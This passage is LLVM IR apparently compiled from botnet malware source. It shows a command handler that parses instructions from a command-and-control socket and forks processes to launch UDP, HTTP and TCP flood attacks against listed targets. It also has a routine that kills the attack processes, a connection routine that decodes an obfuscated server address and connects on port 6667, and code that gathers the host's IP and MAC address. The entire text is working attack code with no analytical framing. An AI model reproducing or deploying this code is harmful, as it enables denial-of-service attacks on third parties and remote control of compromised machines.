  br i1 %291, label %307, label %292

292:                                              ; preds = %286
  %293 = load i8**, i8*** %4, align 8
  %294 = getelementptr inbounds i8*, i8** %293, i64 4
  %295 = load i8*, i8** %294, align 8
  %296 = call i32 @atoi(i8* %295) #11
  %297 = icmp sgt i32 %296, 32
  br i1 %297, label %307, label %298

298:                                              ; preds = %292
  %299 = load i32, i32* %3, align 4
  %300 = icmp eq i32 %299, 7
  br i1 %300, label %301, label %308

301:                                              ; preds = %298
  %302 = load i8**, i8*** %4, align 8
  %303 = getelementptr inbounds i8*, i8** %302, i64 6
  %304 = load i8*, i8** %303, align 8
  %305 = call i32 @atoi(i8* %304) #11
  %306 = icmp slt i32 %305, 1
  br i1 %306, label %307, label %308

307:                                              ; preds = %301, %292, %286, %280, %274, %268, %262, %259
  br label %640

308:                                              ; preds = %301, %298
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds i8*, i8** %309, i64 1
  %311 = load i8*, i8** %310, align 8
  store i8* %311, i8** %14, align 8
  %312 = load i8**, i8*** %4, align 8
  %313 = getelementptr inbounds i8*, i8** %312, i64 2
  %314 = load i8*, i8** %313, align 8
  %315 = call i32 @atoi(i8* %314) #11
  store i32 %315, i32* %15, align 4
  %316 = load i8**, i8*** %4, align 8
  %317 = getelementptr inbounds i8*, i8** %316, i64 3
  %318 = load i8*, i8** %317, align 8
  %319 = call i32 @atoi(i8* %318) #11
  store i32 %319, i32* %16, align 4
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 4
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @atoi(i8* %322) #11
  store i32 %323, i32* %17, align 4
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 5
  %326 = load i8*, i8** %325, align 8
  %327 = call i32 @atoi(i8* %326) #11
  store i32 %327, i32* %18, align 4
  %328 = load i32, i32* %3, align 4
  %329 = icmp eq i32 %328, 7
  br i1 %329, label %330, label %335

330:                                              ; preds = %308
  %331 = load i8**, i8*** %4, align 8
  %332 = getelementptr inbounds i8*, i8** %331, i64 6
  %333 = load i8*, i8** %332, align 8
  %334 = call i32 @atoi(i8* %333) #11
  br label %336

335:                                              ; preds = %308
  br label %336

336:                                              ; preds = %335, %330
  %337 = phi i32 [ %334, %330 ], [ 10, %335 ]
  store i32 %337, i32* %19, align 4
  %338 = load i8*, i8** %14, align 8
  %339 = call i8* @strstr(i8* %338, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #11
  %340 = icmp ne i8* %339, null
  br i1 %340, label %341, label %366

341:                                              ; preds = %336
  %342 = load i32, i32* @mainCommSock, align 4
  %343 = load i8*, i8** %14, align 8
  %344 = load i32, i32* %16, align 4
  %345 = call i32 (i32, i8*, ...) @sockprintf(i32 %342, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.62, i64 0, i64 0), i8* %343, i32 %344)
  %346 = load i8*, i8** %14, align 8
  %347 = call i8* @strtok(i8* %346, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %347, i8** %20, align 8
  br label %348

348:                                              ; preds = %363, %341
  %349 = load i8*, i8** %20, align 8
  %350 = icmp ne i8* %349, null
  br i1 %350, label %351, label %365

351:                                              ; preds = %348
  %352 = call i32 @listFork()
  %353 = icmp ne i32 %352, 0
  br i1 %353, label %363, label %354

354:                                              ; preds = %351
  %355 = load i8*, i8** %20, align 8
  %356 = load i32, i32* %15, align 4
  %357 = load i32, i32* %16, align 4
  %358 = load i32, i32* %17, align 4
  %359 = load i32, i32* %18, align 4
  %360 = load i32, i32* %19, align 4
  call void @sendUDP(i8* %355, i32 %356, i32 %357, i32 %358, i32 %359, i32 %360)
  %361 = load i32, i32* @mainCommSock, align 4
  %362 = call i32 @close(i32 %361)
  call void @_exit(i32 0) #14
  unreachable

363:                                              ; preds = %351
  %364 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %364, i8** %20, align 8
  br label %348, !llvm.loop !55

365:                                              ; preds = %348
  br label %384

366:                                              ; preds = %336
  %367 = call i32 @listFork()
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %369, label %370

369:                                              ; preds = %366
  br label %640

370:                                              ; preds = %366
  %371 = load i32, i32* @mainCommSock, align 4
  %372 = load i8*, i8** %14, align 8
  %373 = load i32, i32* %15, align 4
  %374 = load i32, i32* %16, align 4
  %375 = call i32 (i32, i8*, ...) @sockprintf(i32 %371, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.63, i64 0, i64 0), i8* %372, i32 %373, i32 %374)
  %376 = load i8*, i8** %14, align 8
  %377 = load i32, i32* %15, align 4
  %378 = load i32, i32* %16, align 4
  %379 = load i32, i32* %17, align 4
  %380 = load i32, i32* %18, align 4
  %381 = load i32, i32* %19, align 4
  call void @sendUDP(i8* %376, i32 %377, i32 %378, i32 %379, i32 %380, i32 %381)
  %382 = load i32, i32* @mainCommSock, align 4
  %383 = call i32 @close(i32 %382)
  call void @_exit(i32 0) #14
  unreachable

384:                                              ; preds = %365
  br label %385

385:                                              ; preds = %384, %253
  %386 = load i8**, i8*** %4, align 8
  %387 = getelementptr inbounds i8*, i8** %386, i64 0
  %388 = load i8*, i8** %387, align 8
  %389 = call i32 @strcmp(i8* %388, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i64 0, i64 0)) #11
  %390 = icmp ne i32 %389, 0
  br i1 %390, label %447, label %391

391:                                              ; preds = %385
  %392 = load i32, i32* %3, align 4
  %393 = icmp slt i32 %392, 3
  br i1 %393, label %400, label %394

394:                                              ; preds = %391
  %395 = load i8**, i8*** %4, align 8
  %396 = getelementptr inbounds i8*, i8** %395, i64 2
  %397 = load i8*, i8** %396, align 8
  %398 = call i32 @atoi(i8* %397) #11
  %399 = icmp slt i32 %398, 1
  br i1 %399, label %400, label %401

400:                                              ; preds = %394, %391
  br label %640

401:                                              ; preds = %394
  %402 = load i8**, i8*** %4, align 8
  %403 = getelementptr inbounds i8*, i8** %402, i64 1
  %404 = load i8*, i8** %403, align 8
  store i8* %404, i8** %21, align 8
  %405 = load i8**, i8*** %4, align 8
  %406 = getelementptr inbounds i8*, i8** %405, i64 2
  %407 = load i8*, i8** %406, align 8
  %408 = call i32 @atoi(i8* %407) #11
  store i32 %408, i32* %22, align 4
  %409 = load i8*, i8** %21, align 8
  %410 = call i8* @strstr(i8* %409, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #11
  %411 = icmp ne i8* %410, null
  br i1 %411, label %412, label %433

412:                                              ; preds = %401
  %413 = load i32, i32* @mainCommSock, align 4
  %414 = load i8*, i8** %21, align 8
  %415 = load i32, i32* %22, align 4
  %416 = call i32 (i32, i8*, ...) @sockprintf(i32 %413, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i64 0, i64 0), i8* %414, i32 %415)
  %417 = load i8*, i8** %21, align 8
  %418 = call i8* @strtok(i8* %417, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %418, i8** %23, align 8
  br label %419

419:                                              ; preds = %430, %412
  %420 = load i8*, i8** %23, align 8
  %421 = icmp ne i8* %420, null
  br i1 %421, label %422, label %432

422:                                              ; preds = %419
  %423 = call i32 @listFork()
  %424 = icmp ne i32 %423, 0
  br i1 %424, label %430, label %425

425:                                              ; preds = %422
  %426 = load i8*, i8** %21, align 8
  %427 = load i32, i32* %22, align 4
  call void @sendHTTP(i8* %426, i32 %427)
  %428 = load i32, i32* @mainCommSock, align 4
  %429 = call i32 @close(i32 %428)
  call void @_exit(i32 0) #14
  unreachable

430:                                              ; preds = %422
  %431 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %431, i8** %23, align 8
  br label %419, !llvm.loop !56

432:                                              ; preds = %419
  br label %446

433:                                              ; preds = %401
  %434 = call i32 @listFork()
  %435 = icmp ne i32 %434, 0
  br i1 %435, label %436, label %437

436:                                              ; preds = %433
  br label %640

437:                                              ; preds = %433
  %438 = load i32, i32* @mainCommSock, align 4
  %439 = load i8*, i8** %21, align 8
  %440 = load i32, i32* %22, align 4
  %441 = call i32 (i32, i8*, ...) @sockprintf(i32 %438, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i64 0, i64 0), i8* %439, i32 %440)
  %442 = load i8*, i8** %21, align 8
  %443 = load i32, i32* %22, align 4
  call void @sendHTTP(i8* %442, i32 %443)
  %444 = load i32, i32* @mainCommSock, align 4
  %445 = call i32 @close(i32 %444)
  call void @_exit(i32 0) #14
  unreachable

446:                                              ; preds = %432
  br label %447

447:                                              ; preds = %446, %385
  %448 = load i8**, i8*** %4, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 0
  %450 = load i8*, i8** %449, align 8
  %451 = call i32 @strcmp(i8* %450, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i64 0, i64 0)) #11
  %452 = icmp ne i32 %451, 0
  br i1 %452, label %586, label %453

453:                                              ; preds = %447
  %454 = load i32, i32* %3, align 4
  %455 = icmp slt i32 %454, 6
  br i1 %455, label %498, label %456

456:                                              ; preds = %453
  %457 = load i8**, i8*** %4, align 8
  %458 = getelementptr inbounds i8*, i8** %457, i64 3
  %459 = load i8*, i8** %458, align 8
  %460 = call i32 @atoi(i8* %459) #11
  %461 = icmp eq i32 %460, -1
  br i1 %461, label %498, label %462

462:                                              ; preds = %456
  %463 = load i8**, i8*** %4, align 8
  %464 = getelementptr inbounds i8*, i8** %463, i64 2
  %465 = load i8*, i8** %464, align 8
  %466 = call i32 @atoi(i8* %465) #11
  %467 = icmp eq i32 %466, -1
  br i1 %467, label %498, label %468

468:                                              ; preds = %462
  %469 = load i8**, i8*** %4, align 8
  %470 = getelementptr inbounds i8*, i8** %469, i64 4
  %471 = load i8*, i8** %470, align 8
  %472 = call i32 @atoi(i8* %471) #11
  %473 = icmp eq i32 %472, -1
  br i1 %473, label %498, label %474

474:                                              ; preds = %468
  %475 = load i8**, i8*** %4, align 8
  %476 = getelementptr inbounds i8*, i8** %475, i64 4
  %477 = load i8*, i8** %476, align 8
  %478 = call i32 @atoi(i8* %477) #11
  %479 = icmp sgt i32 %478, 32
  br i1 %479, label %498, label %480

480:                                              ; preds = %474
  %481 = load i32, i32* %3, align 4
  %482 = icmp sgt i32 %481, 6
  br i1 %482, label %483, label %489

483:                                              ; preds = %480
  %484 = load i8**, i8*** %4, align 8
  %485 = getelementptr inbounds i8*, i8** %484, i64 6
  %486 = load i8*, i8** %485, align 8
  %487 = call i32 @atoi(i8* %486) #11
  %488 = icmp slt i32 %487, 0
  br i1 %488, label %498, label %489

489:                                              ; preds = %483, %480
  %490 = load i32, i32* %3, align 4
  %491 = icmp eq i32 %490, 8
  br i1 %491, label %492, label %499

492:                                              ; preds = %489
  %493 = load i8**, i8*** %4, align 8
  %494 = getelementptr inbounds i8*, i8** %493, i64 7
  %495 = load i8*, i8** %494, align 8
  %496 = call i32 @atoi(i8* %495) #11
  %497 = icmp slt i32 %496, 1
  br i1 %497, label %498, label %499

498:                                              ; preds = %492, %483, %474, %468, %462, %456, %453
  br label %640

499:                                              ; preds = %492, %489
  %500 = load i8**, i8*** %4, align 8
  %501 = getelementptr inbounds i8*, i8** %500, i64 1
  %502 = load i8*, i8** %501, align 8
  store i8* %502, i8** %24, align 8
  %503 = load i8**, i8*** %4, align 8
  %504 = getelementptr inbounds i8*, i8** %503, i64 2
  %505 = load i8*, i8** %504, align 8
  %506 = call i32 @atoi(i8* %505) #11
  store i32 %506, i32* %25, align 4
  %507 = load i8**, i8*** %4, align 8
  %508 = getelementptr inbounds i8*, i8** %507, i64 3
  %509 = load i8*, i8** %508, align 8
  %510 = call i32 @atoi(i8* %509) #11
  store i32 %510, i32* %26, align 4
  %511 = load i8**, i8*** %4, align 8
  %512 = getelementptr inbounds i8*, i8** %511, i64 4
  %513 = load i8*, i8** %512, align 8
  %514 = call i32 @atoi(i8* %513) #11
  store i32 %514, i32* %27, align 4
  %515 = load i8**, i8*** %4, align 8
  %516 = getelementptr inbounds i8*, i8** %515, i64 5
  %517 = load i8*, i8** %516, align 8
  store i8* %517, i8** %28, align 8
  %518 = load i32, i32* %3, align 4
  %519 = icmp eq i32 %518, 8
  br i1 %519, label %520, label %525

520:                                              ; preds = %499
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 7
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @atoi(i8* %523) #11
  br label %526

525:                                              ; preds = %499
  br label %526

526:                                              ; preds = %525, %520
  %527 = phi i32 [ %524, %520 ], [ 10, %525 ]
  store i32 %527, i32* %29, align 4
  %528 = load i32, i32* %3, align 4
  %529 = icmp sgt i32 %528, 6
  br i1 %529, label %530, label %535

530:                                              ; preds = %526
  %531 = load i8**, i8*** %4, align 8
  %532 = getelementptr inbounds i8*, i8** %531, i64 6
  %533 = load i8*, i8** %532, align 8
  %534 = call i32 @atoi(i8* %533) #11
  br label %536

535:                                              ; preds = %526
  br label %536

536:                                              ; preds = %535, %530
  %537 = phi i32 [ %534, %530 ], [ 0, %535 ]
  store i32 %537, i32* %30, align 4
  %538 = load i8*, i8** %24, align 8
  %539 = call i8* @strstr(i8* %538, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #11
  %540 = icmp ne i8* %539, null
  br i1 %540, label %541, label %567

541:                                              ; preds = %536
  %542 = load i32, i32* @mainCommSock, align 4
  %543 = load i8*, i8** %24, align 8
  %544 = load i32, i32* %26, align 4
  %545 = call i32 (i32, i8*, ...) @sockprintf(i32 %542, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i64 0, i64 0), i8* %543, i32 %544)
  %546 = load i8*, i8** %24, align 8
  %547 = call i8* @strtok(i8* %546, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %547, i8** %31, align 8
  br label %548

548:                                              ; preds = %564, %541
  %549 = load i8*, i8** %31, align 8
  %550 = icmp ne i8* %549, null
  br i1 %550, label %551, label %566

551:                                              ; preds = %548
  %552 = call i32 @listFork()
  %553 = icmp ne i32 %552, 0
  br i1 %553, label %564, label %554

554:                                              ; preds = %551
  %555 = load i8*, i8** %31, align 8
  %556 = load i32, i32* %25, align 4
  %557 = load i32, i32* %26, align 4
  %558 = load i32, i32* %27, align 4
  %559 = load i8*, i8** %28, align 8
  %560 = load i32, i32* %30, align 4
  %561 = load i32, i32* %29, align 4
  call void @sendTCP(i8* %555, i32 %556, i32 %557, i32 %558, i8* %559, i32 %560, i32 %561)
  %562 = load i32, i32* @mainCommSock, align 4
  %563 = call i32 @close(i32 %562)
  call void @_exit(i32 0) #14
  unreachable

564:                                              ; preds = %551
  %565 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %565, i8** %31, align 8
  br label %548, !llvm.loop !57

566:                                              ; preds = %548
  br label %585

567:                                              ; preds = %536
  %568 = call i32 @listFork()
  %569 = icmp ne i32 %568, 0
  br i1 %569, label %570, label %571

570:                                              ; preds = %567
  br label %640

571:                                              ; preds = %567
  %572 = load i32, i32* @mainCommSock, align 4
  %573 = load i8*, i8** %24, align 8
  %574 = load i32, i32* %26, align 4
  %575 = call i32 (i32, i8*, ...) @sockprintf(i32 %572, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i64 0, i64 0), i8* %573, i32 %574)
  %576 = load i8*, i8** %24, align 8
  %577 = load i32, i32* %25, align 4
  %578 = load i32, i32* %26, align 4
  %579 = load i32, i32* %27, align 4
  %580 = load i8*, i8** %28, align 8
  %581 = load i32, i32* %30, align 4
  %582 = load i32, i32* %29, align 4
  call void @sendTCP(i8* %576, i32 %577, i32 %578, i32 %579, i8* %580, i32 %581, i32 %582)
  %583 = load i32, i32* @mainCommSock, align 4
  %584 = call i32 @close(i32 %583)
  call void @_exit(i32 0) #14
  unreachable

585:                                              ; preds = %566
  br label %586

586:                                              ; preds = %585, %447
  %587 = load i8**, i8*** %4, align 8
  %588 = getelementptr inbounds i8*, i8** %587, i64 0
  %589 = load i8*, i8** %588, align 8
  %590 = call i32 @strcmp(i8* %589, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i64 0, i64 0)) #11
  %591 = icmp ne i32 %590, 0
  br i1 %591, label %633, label %592

592:                                              ; preds = %586
  store i32 0, i32* %32, align 4
  store i64 0, i64* %33, align 8
  br label %593

593:                                              ; preds = %619, %592
  %594 = load i64, i64* %33, align 8
  %595 = load i64, i64* @numpids, align 8
  %596 = icmp ult i64 %594, %595
  br i1 %596, label %597, label %622

597:                                              ; preds = %593
  %598 = load i32*, i32** @pids, align 8
  %599 = load i64, i64* %33, align 8
  %600 = getelementptr inbounds i32, i32* %598, i64 %599
  %601 = load i32, i32* %600, align 4
  %602 = icmp ne i32 %601, 0
  br i1 %602, label %603, label %618

603:                                              ; preds = %597
  %604 = load i32*, i32** @pids, align 8
  %605 = load i64, i64* %33, align 8
  %606 = getelementptr inbounds i32, i32* %604, i64 %605
  %607 = load i32, i32* %606, align 4
  %608 = call i32 @getpid() #12
  %609 = icmp ne i32 %607, %608
  br i1 %609, label %610, label %618

610:                                              ; preds = %603
  %611 = load i32*, i32** @pids, align 8
  %612 = load i64, i64* %33, align 8
  %613 = getelementptr inbounds i32, i32* %611, i64 %612
  %614 = load i32, i32* %613, align 4
  %615 = call i32 @kill(i32 %614, i32 9) #12
  %616 = load i32, i32* %32, align 4
  %617 = add nsw i32 %616, 1
  store i32 %617, i32* %32, align 4
  br label %618

618:                                              ; preds = %610, %603, %597
  br label %619

619:                                              ; preds = %618
  %620 = load i64, i64* %33, align 8
  %621 = add i64 %620, 1
  store i64 %621, i64* %33, align 8
  br label %593, !llvm.loop !58

622:                                              ; preds = %593
  %623 = load i32, i32* %32, align 4
  %624 = icmp sgt i32 %623, 0
  br i1 %624, label %625, label %629

625:                                              ; preds = %622
  %626 = load i32, i32* @mainCommSock, align 4
  %627 = load i32, i32* %32, align 4
  %628 = call i32 (i32, i8*, ...) @sockprintf(i32 %626, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.69, i64 0, i64 0), i32 %627)
  br label %632

629:                                              ; preds = %622
  %630 = load i32, i32* @mainCommSock, align 4
  %631 = call i32 (i32, i8*, ...) @sockprintf(i32 %630, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i64 0, i64 0))
  br label %632

632:                                              ; preds = %629, %625
  br label %633

633:                                              ; preds = %632, %586
  %634 = load i8**, i8*** %4, align 8
  %635 = getelementptr inbounds i8*, i8** %634, i64 0
  %636 = load i8*, i8** %635, align 8
  %637 = call i32 @strcmp(i8* %636, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i64 0, i64 0)) #11
  %638 = icmp ne i32 %637, 0
  br i1 %638, label %640, label %639

639:                                              ; preds = %633
  call void @exit(i32 0) #16
  unreachable

640:                                              ; preds = %39, %48, %62, %74, %87, %92, %97, %122, %164, %198, %240, %307, %369, %400, %436, %498, %570, %633
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #10

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %4, i8 0, i64 512, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

7:                                                ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

10:                                               ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

15:                                               ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

16:                                               ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

19:                                               ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @decode(i8* %24)
  %26 = call i8* @strcpy(i8* %20, i8* %25) #12
  store i32 6667, i32* %3, align 4
  %27 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %28 = call i8* @strchr(i8* %27, i32 58) #11
  %29 = icmp ne i8* %28, null
  br i1 %29, label %30, label %37

30:                                               ; preds = %19
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %32 = call i8* @strchr(i8* %31, i32 58) #11
  %33 = getelementptr inbounds i8, i8* %32, i64 1
  %34 = call i32 @atoi(i8* %33) #11
  store i32 %34, i32* %3, align 4
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %36 = call i8* @strchr(i8* %35, i32 58) #11
  store i8 0, i8* %36, align 1
  br label %37

37:                                               ; preds = %30, %19
  %38 = call i32 @socket(i32 2, i32 1, i32 0) #12
  store i32 %38, i32* @mainCommSock, align 4
  %39 = load i32, i32* @mainCommSock, align 4
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %41 = load i32, i32* %3, align 4
  %42 = call i32 @connectTimeout(i32 %39, i8* %40, i32 %41, i32 30)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %45, label %44

44:                                               ; preds = %37
  store i32 1, i32* %1, align 4
  br label %46

45:                                               ; preds = %37
  store i32 0, i32* %1, align 4
  br label %46

46:                                               ; preds = %45, %44
  %47 = load i32, i32* %1, align 4
  ret i32 %47
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #12
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

16:                                               ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %17, i8 0, i64 16, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.72, i64 0, i64 0)) #12
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #15
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

29:                                               ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

30:                                               ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #12
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

37:                                               ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.73, i64 0, i64 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

42:                                               ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

47:                                               ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i64 0, i64 0)) #11
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

51:                                               ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %52, i8** %9, align 8
  br label %53

53:                                               ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

58:                                               ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53, !llvm.loop !59

61:                                               ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

63:                                               ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %64, i8 0, i64 4096, i1 false)
  br label %42, !llvm.loop !60

65:                                               ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

71:                                               ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i64 0, i64 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #12
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #12
  store i32 0, i32* %10, align 4
  br label %79

79:                                               ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

82:                                               ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i64 0, i64 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

94:                                               ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79, !llvm.loop !61

97:                                               ; preds = %79
  br label %98

98:                                               ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

101:                                              ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i64 0, i64 0)
}

